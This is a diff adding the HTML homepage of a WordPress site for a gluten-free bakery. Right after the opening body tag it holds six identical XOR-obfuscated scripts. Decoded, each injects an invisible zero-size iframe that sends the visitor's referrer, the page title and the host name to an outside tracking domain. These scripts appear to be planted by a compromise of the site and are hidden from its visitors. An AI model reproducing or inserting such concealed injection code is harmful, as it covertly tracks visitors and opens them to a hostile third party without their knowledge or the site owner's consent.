@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en" > <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en" > <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en" > <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<html lang="en">
+<!--<![endif]-->
+<head>
+
+
+	<!-- Basic Page Needs
+ 	================================================== -->
+	<meta charset="UTF-8">
+	
+		<title>Sologoodness </title>
+	
+
+    	    <meta name="description" content="Just another WordPress site" /> 
+        
+    
+    		
+    <meta name="robots" content="index, follow" />
+    
+    
+    <!--[if IE]>
+		<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=EmulateIE8; IE=EDGE" />
+		<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+	<!--[if IE 8]><link rel="stylesheet" type="text/css" href="http://www.sologoodness.com/wp-content/themes/colangine/styles/ie.css" media="screen" /><![endif]-->
+    
+    
+    
+    	<!-- Mobile Specific Metas
+    ================================================== -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+        
+    
+    
+	<!-- Favicons
+	================================================== -->
+	
+    	<link href="http://www.sologoodness.com/wp-content/themes/colangine/images/favicon.ico" rel="shortcut icon" /> 
+	    
+    	<link rel="apple-touch-icon" href="http://www.sologoodness.com/wp-content/uploads/2014/04/apple-touch-icon2.png" /> 
+	    
+        
+        
+        
+
+    <link href='http://fonts.googleapis.com/css?family=Oswald:400,400italic,700,700italic|Oswald:400,400italic,700,700italic|Oswald:400,400italic,700,700italic|Oswald:400,400italic,700,700italic|Oswald:400,400italic,700,700italic|Oswald:400,400italic,700,700italic|Oswald:400,400italic,700,700italic&amp;subset=latin,latin-ext,cyrillic,cyrillic-ext,greek-ext,greek,vietnamese' rel='stylesheet' type='text/css'>  	
+
+   
+    <link rel="alternate" type="application/rss+xml" title="Sologoodness &raquo; Feed" href="http://www.sologoodness.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Sologoodness &raquo; Comments Feed" href="http://www.sologoodness.com/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Sologoodness &raquo; Home Comments Feed" href="http://www.sologoodness.com/home/feed/" />
+<link rel='stylesheet' id='stylesheet-css'  href='http://www.sologoodness.com/wp-content/themes/colangine/style.css?ver=1.2.5' type='text/css' media='all' />
+<link rel='stylesheet' id='jplayer-css'  href='http://www.sologoodness.com/wp-content/themes/colangine/styles/jplayer/jplayer.css?ver=1.0' type='text/css' media='all' />
+<link rel='stylesheet' id='googlefont-css'  href='http://fonts.googleapis.com/css?family=Oswald&#038;ver=4.1.4' type='text/css' media='all' />
+<link rel='stylesheet' id='fontello-css'  href='http://www.sologoodness.com/wp-content/themes/colangine/styles/fontello/fontello.css?ver=1.0' type='text/css' media='all' />
+<link rel='stylesheet' id='responsive-css'  href='http://www.sologoodness.com/wp-content/themes/colangine/styles/responsive.css?ver=1.0' type='text/css' media='all' />
+<link rel='stylesheet' id='contact-form-7-css'  href='http://www.sologoodness.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=4.1' type='text/css' media='all' />
+<link rel='stylesheet' id='rs-plugin-settings-css'  href='http://www.sologoodness.com/wp-content/plugins/revslider/rs-plugin/css/settings.css?rev=4.2&#038;ver=4.1.4' type='text/css' media='all' />
+<style id='rs-plugin-settings-inline-css' type='text/css'>
+.tp-caption a {
+color:#ff7302;
+text-shadow:none;
+-webkit-transition:all 0.2s ease-out;
+-moz-transition:all 0.2s ease-out;
+-o-transition:all 0.2s ease-out;
+-ms-transition:all 0.2s ease-out;
+}
+
+.tp-caption a:hover {
+color:#ffa902;
+}
+</style>
+<link rel='stylesheet' id='rs-captions-css'  href='http://www.sologoodness.com/wp-content/plugins/revslider/rs-plugin/css/dynamic-captions.css?rev=4.2&#038;ver=4.1.4' type='text/css' media='all' />
+<link rel='stylesheet' id='wpclef-main-css'  href='http://www.sologoodness.com/wp-content/plugins/wpclef/assets/dist/css/main.min.css?ver=2.2.9.3' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.sologoodness.com/wp-includes/js/jquery/jquery.js?ver=1.11.1'></script>
+<script type='text/javascript' src='http://www.sologoodness.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript' src='http://www.sologoodness.com/wp-content/plugins/revslider/rs-plugin/js/jquery.themepunch.plugins.min.js?rev=4.2&#038;ver=4.1.4'></script>
+<script type='text/javascript' src='http://www.sologoodness.com/wp-content/plugins/revslider/rs-plugin/js/jquery.themepunch.revolution.min.js?rev=4.2&#038;ver=4.1.4'></script>
+<script type='text/javascript' src='http://www.sologoodness.com/wp-content/themes/colangine/js/jquery.easing.1.3.js?ver=1.3'></script>
+<script type='text/javascript' src='http://www.sologoodness.com/wp-content/themes/colangine/js/superfish.js?ver=1.4.8'></script>
+<script type='text/javascript' src='http://www.sologoodness.com/wp-content/themes/colangine/js/jquery.flexslider-min.js?ver=2.1'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.sologoodness.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.sologoodness.com/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 4.1.4" />
+<link rel='canonical' href='http://www.sologoodness.com/' />
+<link rel='shortlink' href='http://www.sologoodness.com/' />
+	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+
+<!-- Custom CSS Codes
+========================================================= -->
+	
+<style type="text/css" media="all">
+
+
+	
+	
+	.tparrows {
+			   text-align:center;
+			   font-family:fontello;
+			   line-height:40px;
+			   font-size:15px;
+			   color:#FFF;
+			   width:40px !important;
+			   height:40px !important;
+			   border-radius:4px;
+			   background:none !important;
+			   background-color:#1ABC9C !important;
+			   opacity:.6
+			   }
+	.tp-leftarrow.default:before {content: "";}
+	.tp-rightarrow.default:before {content: "";}
+	.tp-rightarrow:hover,.tp-leftarrow:hover{opacity:1}
+	.tp-bullets{background:none !important;}
+	.rev_slider_wrapper .tp-bullets.simplebullets.navbar-old .bullet{
+		background:#ccc !important;
+		width:12px !important;
+		height:12px !important;
+		margin:0 3px !important;
+		border-radius:50%;
+		}
+	.rev_slider_wrapper .tp-bullets.simplebullets.navbar-old .bullet:hover,
+	.rev_slider_wrapper .tp-bullets.simplebullets.navbar-old .bullet.selected{background:#1ABC9C !important;}
+	
+		
+	
+	
+		
+	
+			.blocked {border-radius: 4px;}
+		.blocked #footer{border-radius:0 0 4px 4px;}
+		.blocked #header div:first-child {border-radius:4px 4px 0 0;}
+		
+	
+	</style>
+
+
+
+
+		
+		
+	
+
+
+    
+    
+    
+</head>
+
+<body class="home page page-id-23 page-template-default">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+
+    
+	<div id="layout" class="blocked">
+		<header id="header">
+        
+        	            
+            			<div class="second-head head-1"  id="sticky" >
+				<div class="row clearfix">
+					
+                    <div class="grid_3">
+						<a href="http://www.sologoodness.com"><img class="logo" src="http://www.sologoodness.com/wp-content/uploads/2014/04/solo-goodness-logo11.png" alt="Sologoodness" /></a>
+					</div>
+
+					
+                                             <div class="social head-social animdelay" data-gen="fadeInRight">			
+      						
+
+	
+        
+    
+     
+      
+        
+     
+    
+    
+     
+    
+    
+     
+    
+    
+     
+    
+    
+     
+    
+    
+     
+    
+    
+     
+    
+    
+     
+    
+    
+     
+    
+    
+     
+    
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+     
+    
+    
+     
+    
+     
+    
+     
+    
+     
+    
+     
+    
+     
+    
+     
+    
+    
+     
+    
+    
+     
+    
+    
+     
+    
+    
+     
+    
+                        </div>          
+					                     
+                    
+					<nav class="main"><ul id="menu-main-menu" class="sf-menu"><li id="menu-item-136" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-23 current_page_item"><a href="http://www.sologoodness.com/">Home</a></li>
+<li id="menu-item-146" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="http://www.sologoodness.com/about-us/">About Us</a></li>
+<li id="menu-item-149" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="http://www.sologoodness.com/product/">Our Products</a></li>
+<li id="menu-item-153" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children"><a href="http://www.sologoodness.com/recipes/">Recipes</a>
+<ul class="sub-menu">
+	<li id="menu-item-154" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="http://www.sologoodness.com/recipes/awesome-gluten-free-lemon-poppy-seed-loaf/">Gluten Free Lemon &#038; Poppy</a></li>
+	<li id="menu-item-151" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="http://www.sologoodness.com/recipes/ultimate-gluten-free-cupcake/">Gluten Free Cupcake</a></li>
+	<li id="menu-item-150" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="http://www.sologoodness.com/recipes/best-gluten-free-brownies-ever/">Gluten Free Brownies</a></li>
+</ul>
+</li>
+<li id="menu-item-141" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="http://www.sologoodness.com/retailers/">Retailers</a></li>
+<li id="menu-item-137" class="menu-item menu-item-type-post_type menu-item-object-page"><a href="http://www.sologoodness.com/contact-us/">Contact Us</a></li>
+</ul></nav> 
+                    
+                    
+                    
+				</div><!-- row -->
+			</div><!-- second head -->
+		</header>
+
+
+		
+        
+        
+		
+		
+        			
+
+	
+	            
+           
+    <style type="text/css">
+    	@import url("http://www.sologoodness.com/wp-content/themes/colangine/styles/nivoslider.css");
+    </style>  
+	
+		<script language="javascript">
+			jQuery(document).ready(function($) {
+				
+				// Nivo Slider //////////////////
+				try {
+					$('.nivoslider').nivoSlider({
+						   animSpeed: 700,
+						   pauseTime: 4000,
+						   prevText: "",
+    					   nextText: ""
+					});
+					} catch(e){}
+
+			});
+        </script>
+            
+            
+            <!-- SLIDER -->   
+            <div class="nivo-full clearfix">
+
+                    <div class="nivoslider">
+                    
+                        
+                    	
+                                                  						 
+                                                 
+                                                                        									<img width="1140" height="350" src="http://www.sologoodness.com/wp-content/uploads/2014/04/Sologoodness-gluten-free-cookie-031.jpg" class="attachment-photo_slider wp-post-image" alt="Pistachio Financier" title="#cap-30" />  
+                                                    	   
+                                                
+                        
+                    	
+                                                  						 
+                                                 
+                                                                        									<img width="1140" height="350" src="http://www.sologoodness.com/wp-content/uploads/2014/04/Sologoodness-gluten-free-cookie-041.jpg" class="attachment-photo_slider wp-post-image" alt="Abricotines" title="#cap-33" />  
+                                                    	   
+                                                
+                        
+                    	
+                                                  						 
+                                                 
+                                                                        									<img width="1140" height="350" src="http://www.sologoodness.com/wp-content/uploads/2014/04/Sologoodness-gluten-free-cookie-051.jpg" class="attachment-photo_slider wp-post-image" alt="Chocolate Brownie" title="#cap-35" />  
+                                                    	   
+                                                
+                        
+                    	
+                                                  						 
+                                                 
+                                                                        									<img width="1140" height="350" src="http://www.sologoodness.com/wp-content/uploads/2014/04/Sologoodness-gluten-free-cookie-011.jpg" class="attachment-photo_slider wp-post-image" alt="Fruit and Nut Biscotti" title="#cap-17" />  
+                                                    	   
+                                                
+                        
+                    	
+                                                  						 
+                                                 
+                                                                        									<img width="1140" height="350" src="http://www.sologoodness.com/wp-content/uploads/2014/04/Sologoodness-gluten-free-cookie-021.jpg" class="attachment-photo_slider wp-post-image" alt="Scones" title="#cap-27" />  
+                                                    	   
+                                                
+                     
+                    
+                     </div><!-- End Nivoslider -->
+                     
+                     
+                  	  
+
+            </div><!-- container -->
+            <!-- End SLIDER --> 
+            
+	         
+		   
+                
+        
+
+		<div class="page-content">
+			<div class="row mbf clearfix">
+            
+            	
+  					                    
+                  	<div class="clearfix">
+				<h3 class="p-title"> Solo Goodness </h3>
+				<div class="proline"><span class="sqi"></span></div>
+			  </div>
+<div class="grid_6 alpha"> We offer delicious, hand baked and healthy goodness&#8230;Solo Goodness. Our baked goods have distinctive variety, wonderful flavours and amazing tastes. We use only natural, fresh ingredients (no preservatives) and we bake in small batches to ensure the highest quality. The real secret to our baking methodology; we hand bake everything with love.</p>
+<p>If you are following a gluten/wheat-free and dairy-free/casein-free (GFCF) diet, then this is the perfect place for you as all of our products are gluten and dairy free. Our gluten free products meet the following requirements:<br />
+● We use a dedicated gluten free facility to eliminate gluten contamination.<br />
+● Every product is heat sealed in CFIA (<em>Canadian Food Inspection Agency)</em> approved clear packaging to prevent cross contamination during shipping and handling.</p>
+<p>Looking through shelves of supermarkets we have been disappointed at the limited variety of products available. And the products that exist as “healthy” certainly don’t taste that way. So, having a passion for baking, we decided to put time, energy and effort into making hand baked, delicious goodies that our friends and family can enjoy&#8230;. give us a try and become a believer in Solo Goodness.</p>
+<p>&nbsp;</p>
+</div>
+<div class="grid_6 omega"> <div class='video-embed'><iframe src='http://player.vimeo.com/video/86916665?autoplay=&amp;title=0&amp;byline=0&amp;portrait=0' width='540' height='298' class='iframe'></iframe></div> </div>
+                                            
+                                    
+             
+	
+			</div><!-- row -->
+		</div><!-- end page content -->
+        
+        
+    
+    <footer id="footer">
+        <div class="row clearfix">
+            <div id="colangine_menu-2" class="footer_widget widget_colangine_menu grid_4"><div class="menu-main-menu-container"><ul id="menu-main-menu-1" class="menu"><li id="menu-item-136" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-23 current_page_item menu-item-136"><a href="http://www.sologoodness.com/">Home</a></li>
+<li id="menu-item-146" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-146"><a href="http://www.sologoodness.com/about-us/">About Us</a></li>
+<li id="menu-item-149" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-149"><a href="http://www.sologoodness.com/product/">Our Products</a></li>
+<li id="menu-item-153" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-153"><a href="http://www.sologoodness.com/recipes/">Recipes</a>
+<ul class="sub-menu">
+	<li id="menu-item-154" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-154"><a href="http://www.sologoodness.com/recipes/awesome-gluten-free-lemon-poppy-seed-loaf/">Gluten Free Lemon &#038; Poppy</a></li>
+	<li id="menu-item-151" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-151"><a href="http://www.sologoodness.com/recipes/ultimate-gluten-free-cupcake/">Gluten Free Cupcake</a></li>
+	<li id="menu-item-150" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-150"><a href="http://www.sologoodness.com/recipes/best-gluten-free-brownies-ever/">Gluten Free Brownies</a></li>
+</ul>
+</li>
+<li id="menu-item-141" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-141"><a href="http://www.sologoodness.com/retailers/">Retailers</a></li>
+<li id="menu-item-137" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-137"><a href="http://www.sologoodness.com/contact-us/">Contact Us</a></li>
+</ul></div></div>        </div><!-- row -->
+
+
+        <div class="copyright alignleft">
+            <h3>Sologoodness</h3>
+            Copyright &copy; 2015 Sologoodness.com. Designed by <a href='http://soosmarmedia.com' target='_blank'>Soosmar Media</a>.        </div>
+        
+        
+    </footer>
+    
+    
+	</div><!-- end layout -->
+    
+    		<div id="toTop"><i class="icon-angle-up"></i></div>
+	    
+    <script type='text/javascript' src='http://www.sologoodness.com/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.51.0-2014.06.20'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var _wpcf7 = {"loaderUrl":"http:\/\/www.sologoodness.com\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","sending":"Sending ..."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://www.sologoodness.com/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=4.1'></script>
+<script type='text/javascript' src='http://www.sologoodness.com/wp-content/themes/colangine/js/twitter/jquery.tweet.js?ver=1.2'></script>
+<script type='text/javascript' src='http://www.sologoodness.com/wp-content/themes/colangine/js/custom.js?ver=1.0'></script>
+<script type='text/javascript' src='http://www.sologoodness.com/wp-content/themes/colangine/js/jquery.jplayer.min.js?ver=2.4.0'></script>
+<script type='text/javascript' src='http://www.sologoodness.com/wp-content/themes/colangine/js/jquery.prettyPhoto.js?ver=3.1'></script>
+<script type='text/javascript' src='http://www.sologoodness.com/wp-includes/js/comment-reply.min.js?ver=4.1.4'></script>
+<script type='text/javascript' src='http://www.sologoodness.com/wp-content/themes/colangine/js/jquery.nivo.slider.pack.js?ver=4.1.4'></script>
+
+<script type="text/javascript">
+function _lightbox(){
+		var lbarray = {			
+			
+						animation_speed: 'fast',
+						overlay_gallery: true,
+			autoplay_slideshow: false,
+						slideshow: 5000,
+									theme: 'pp_default', 
+									opacity: 0.8,
+						show_title: false,
+						allow_resize: true,
+						counter_separator_label: ' of ',
+						deeplinking: false,
+			default_width: 900,
+			default_height: 500
+		};
+
+	
+		jQuery("a[href$=jpg], a[href$=JPG], a[href$=jpeg], a[href$=JPEG], a[href$=png], a[href$=gif], a[data-gal^='photo']").prettyPhoto(lbarray);
+		
+				var windowWidth = 	window.screen.width < window.outerWidth ?
+                  			window.screen.width : window.outerWidth;
+        var issmall = windowWidth < 500;
+        
+        if(issmall){
+	      
+        	jQuery("a[href$=jpg], a[href$=JPG], a[href$=jpeg], a[href$=JPEG], a[href$=png], a[href$=gif], a[data-gal^='photo']").unbind('click.prettyphoto');
+		}
+        		
+	}
+	
+	
+
+    _lightbox();
+
+
+</script>
+
+
+    
+</body>
+</html>
